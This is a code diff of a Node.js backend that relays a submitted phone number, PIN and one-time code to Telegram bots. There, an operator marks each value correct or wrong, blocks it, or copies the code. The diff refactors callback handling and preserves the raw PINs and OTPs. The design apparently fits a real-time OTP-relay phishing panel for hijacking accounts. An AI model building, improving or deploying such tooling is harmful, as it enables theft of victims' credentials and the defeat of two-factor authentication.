@@ -14,12 +14,15 @@ const DOMAIN = (process.env.BACKEND_URL || '').replace(/\/+$/, '');
 const REQUIRED_UPDATES = ['message', 'callback_query'];
 const SEP = '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━';
 const REQ_TTL_MS = 30 * 60 * 1000;
-const CB_MAX_BYTES = 64;
 
 // Keepalive: ping self every 14 minutes to prevent Render free-tier sleep
 const KEEPALIVE_INTERVAL_MS = 14 * 60 * 1000;
 // Webhook refresh: re-register webhooks every 10 minutes
 const WEBHOOK_REFRESH_INTERVAL_MS = 10 * 60 * 1000;
+
+// Telegram hard limits
+const TELEGRAM_MSG_LIMIT = 4096;
+const DISPLAY_CLIP = 3500;
 
 
 // ============================================================
@@ -111,12 +114,30 @@ function newId() {
   return crypto.randomBytes(5).toString('hex');
 }
 
+// Strict clean — only for identifiers (name, phone) where we control format
 function clean(value) {
   const s = String(value == null ? '' : value)
     .replace(/[\u200B-\u200D\uFEFF]/g, '')
     .replace(/[|:]/g, '')
     .trim();
   return /^unknown$/i.test(s) ? '' : s;
+}
+
+// Raw clean — preserves EVERYTHING the user pasted.
+// Only strips characters that genuinely corrupt transport/JSON:
+//   - zero-width invisible chars
+//   - C0 control chars except \n \t \r
+function cleanRaw(value) {
+  return String(value == null ? '' : value)
+    .replace(/[\u200B-\u200D\uFEFF]/g, '')
+    .replace(/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/g, '');
+}
+
+// Truncate for Telegram display only. Full value stays in the store.
+function clipForDisplay(value, max = DISPLAY_CLIP) {
+  const s = String(value == null ? '' : value);
+  if (s.length <= max) return s;
+  return s.slice(0, max) + `… (${s.length - max} more chars)`;
 }
 
 function escapeHtml(value) {
@@ -143,46 +164,22 @@ function buildMessage(header, name, phone, extraLines = []) {
 
 
 // ============================================================
-// CALLBACK DATA PACKING (restart-safe)
+// CALLBACK DATA — action:requestId ONLY.
+// User content never goes into callback_data, so no escaping needed.
 // ============================================================
-function packCallback(action, requestId, name, phone, extra) {
-  const n = clean(name);
-  const p = clean(phone);
-  const e = clean(extra);
-
-  const prefix = `${action}:${requestId}:`;
-  const budget = CB_MAX_BYTES - Buffer.byteLength(prefix, 'utf8');
-
-  if (e) {
-    const full = `${n}|${p}|${e}`;
-    if (Buffer.byteLength(full, 'utf8') <= budget) return prefix + full;
-  }
-  const np = `${n}|${p}`;
-  if (Buffer.byteLength(np, 'utf8') <= budget) return prefix + np;
-
-  const pOnly = `|${p}`;
-  if (Buffer.byteLength(pOnly, 'utf8') <= budget) return prefix + pOnly;
-
-  return prefix + '|';
+function packCallback(action, requestId) {
+  return `${action}:${requestId}`;
 }
 
 function unpackCallback(data) {
   if (!data) return null;
   const i = data.indexOf(':');
-  if (i < 0) return null;
-  const action = data.slice(0, i);
-  const j = data.indexOf(':', i + 1);
-  if (j < 0) {
-    return { action, requestId: data.slice(i + 1), name: '', phone: '', extra: '' };
+  if (i < 0) {
+    return { action: data, requestId: '' };
   }
-  const requestId = data.slice(i + 1, j);
-  const parts = data.slice(j + 1).split('|');
   return {
-    action,
-    requestId,
-    name:  parts[0] || '',
-    phone: parts[1] || '',
-    extra: parts[2] || ''
+    action: data.slice(0, i),
+    requestId: data.slice(i + 1)
   };
 }
 
@@ -235,9 +232,11 @@ async function editMessage(bot, chatId, messageId, text) {
 }
 
 async function answerCallback(bot, callbackId, text) {
+  // Telegram caps answerCallbackQuery.text at 200 chars
+  const safe = String(text || '').slice(0, 200);
   return telegram(bot, 'answerCallbackQuery', {
     callback_query_id: callbackId,
-    text: text || ''
+    text: safe
   });
 }
 
@@ -372,26 +371,26 @@ function handleSubmit(type) {
     if (type === 'phone') {
       header = '📱 PHONE NUMBER VERIFICATION';
       keyboard = [[
-        { text: '✅ Approve', callback_data: packCallback('phone_ok',  requestId, rec.name, rec.phone) },
-        { text: '❌ Reject',  callback_data: packCallback('phone_bad', requestId, rec.name, rec.phone) }
+        { text: '✅ Approve', callback_data: packCallback('phone_ok',  requestId) },
+        { text: '❌ Reject',  callback_data: packCallback('phone_bad', requestId) }
       ]];
     } else if (type === 'pin') {
-      rec.pin = clean(body.pin);
-      extra = [`<b>PIN:</b>  <b><code>${escapeHtml(rec.pin)}</code></b>`];
+      rec.pin = cleanRaw(body.pin);
+      extra = [`<b>PIN:</b>  <b><code>${escapeHtml(clipForDisplay(rec.pin))}</code></b>`];
       header = '🔐 PIN VERIFICATION';
       keyboard = [
-        [{ text: '✅ Correct', callback_data: packCallback('pin_ok',    requestId, rec.name, rec.phone, rec.pin) },
-         { text: '❌ Wrong',   callback_data: packCallback('pin_bad',   requestId, rec.name, rec.phone, rec.pin) }],
-        [{ text: '🛑 Block',   callback_data: packCallback('pin_block', requestId, rec.name, rec.phone, rec.pin) }]
+        [{ text: '✅ Correct', callback_data: packCallback('pin_ok',    requestId) },
+         { text: '❌ Wrong',   callback_data: packCallback('pin_bad',   requestId) }],
+        [{ text: '🛑 Block',   callback_data: packCallback('pin_block', requestId) }]
       ];
     } else if (type === 'code') {
-      rec.code = clean(body.code);
-      extra = [`<b>Code:</b> <b><code>${escapeHtml(rec.code)}</code></b>`];
+      rec.code = cleanRaw(body.code);
+      extra = [`<b>Code:</b> <b><code>${escapeHtml(clipForDisplay(rec.code))}</code></b>`];
       header = '🔑 OTP CODE VERIFICATION';
       keyboard = [
-        [{ text: '✅ Correct', callback_data: packCallback('code_ok',   requestId, rec.name, rec.phone, rec.code) },
-         { text: '❌ Wrong',   callback_data: packCallback('code_bad',  requestId, rec.name, rec.phone, rec.code) }],
-        [{ text: '📋 Copy Code', callback_data: packCallback('code_copy', requestId, rec.name, rec.phone, rec.code) }]
+        [{ text: '✅ Correct', callback_data: packCallback('code_ok',   requestId) },
+         { text: '❌ Wrong',   callback_data: packCallback('code_bad',  requestId) }],
+        [{ text: '📋 Copy Code', callback_data: packCallback('code_copy', requestId) }]
       ];
     }
 
@@ -508,7 +507,7 @@ app.post('/telegram/:botId', async (req, res) => {
 
     // ---- Parse ----
     const parsed = unpackCallback(data);
-    if (!parsed) {
+    if (!parsed || !parsed.requestId) {
       console.log('⚠️ Malformed callback data:', data);
       await answerCallback(bot, callback.id, 'Invalid action');
       return;
@@ -517,35 +516,20 @@ app.post('/telegram/:botId', async (req, res) => {
     const { action, requestId } = parsed;
     console.log('🎯 Action:', action, '| requestId:', requestId);
 
-    // ---- Resolve data: store first, callback fallback ----
-    let rec = store.requests[requestId];
-    let fromCallback = false;
-
+    // ---- Store lookup (single source of truth) ----
+    const rec = store.requests[requestId];
     if (!rec) {
-      console.log('⚠️ Store miss — rebuilding from callback payload');
-      rec = {
-        botId: bot.botId,
-        type: action.startsWith('phone') ? 'phone'
-            : action.startsWith('pin')   ? 'pin'
-            : 'code',
-        name: parsed.name,
-        phone: parsed.phone,
-        pin:  action.startsWith('pin')  ? parsed.extra : undefined,
-        code: action.startsWith('code') ? parsed.extra : undefined,
-        status: 'pending',
-        createdAt: Date.now(),
-        _rebuiltFromCallback: true
-      };
-      store.requests[requestId] = rec;
-      fromCallback = true;
+      console.log('⚠️ Unknown requestId (store miss or expired):', requestId);
+      await answerCallback(bot, callback.id, 'This request has expired.');
+      return;
     }
 
-    console.log('📋 Using:', JSON.stringify({ name: rec.name, phone: rec.phone, fromCallback }));
+    console.log('📋 Using:', JSON.stringify({ name: rec.name, phone: rec.phone }));
 
     // ---- Copy code ----
     if (action === 'code_copy') {
       await answerCallback(bot, callback.id, 'Sent for copying');
-      const payload = `<code>${escapeHtml(rec.code || '')}</code>`;
+      const payload = `<code>${escapeHtml(clipForDisplay(rec.code || ''))}</code>`;
       if (callback.message?.message_id) {
         await replyMessage(bot, callback.message.message_id, payload);
       } else {
@@ -575,19 +559,19 @@ app.post('/telegram/:botId', async (req, res) => {
     rec.updatedAt = Date.now();
     saveStore();
 
-    console.log(`✅ ${action} → ${requestId} (${rec.name} / ${rec.phone}) status=${newStatus}${fromCallback ? ' [from callback]' : ''}`);
+    console.log(`✅ ${action} → ${requestId} (${rec.name} / ${rec.phone}) status=${newStatus}`);
 
     await answerCallback(bot, callback.id, feedback);
 
-    // ---- Rebuild message from the SAME record ----
+    // ---- Rebuild the SAME message from the SAME record ----
     const headers = {
       phone: '📱 PHONE NUMBER VERIFICATION',
       pin:   '🔐 PIN VERIFICATION',
       code:  '🔑 OTP CODE VERIFICATION'
     };
     const extra = [];
-    if (rec.type === 'pin'  && rec.pin)  extra.push(`<b>PIN:</b>  <b><code>${escapeHtml(rec.pin)}</code></b>`);
-    if (rec.type === 'code' && rec.code) extra.push(`<b>Code:</b> <b><code>${escapeHtml(rec.code)}</code></b>`);
+    if (rec.type === 'pin'  && rec.pin)  extra.push(`<b>PIN:</b>  <b><code>${escapeHtml(clipForDisplay(rec.pin))}</code></b>`);
+    if (rec.type === 'code' && rec.code) extra.push(`<b>Code:</b> <b><code>${escapeHtml(clipForDisplay(rec.code))}</code></b>`);
     extra.push(`<b>Status:</b> ${feedback}`);
 
     const newText = buildMessage(headers[rec.type] || 'VERIFICATION', rec.name, rec.phone, extra);
